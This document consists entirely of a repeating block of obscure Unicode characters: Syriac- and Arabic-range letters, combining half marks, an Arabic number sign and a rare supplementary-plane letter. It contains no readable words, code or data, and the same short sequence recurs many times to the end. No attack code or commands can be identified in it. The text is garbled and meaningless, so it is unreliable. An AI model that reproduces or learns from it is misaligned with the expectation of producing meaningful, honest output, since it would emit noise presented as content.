࡛࡙࡙𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬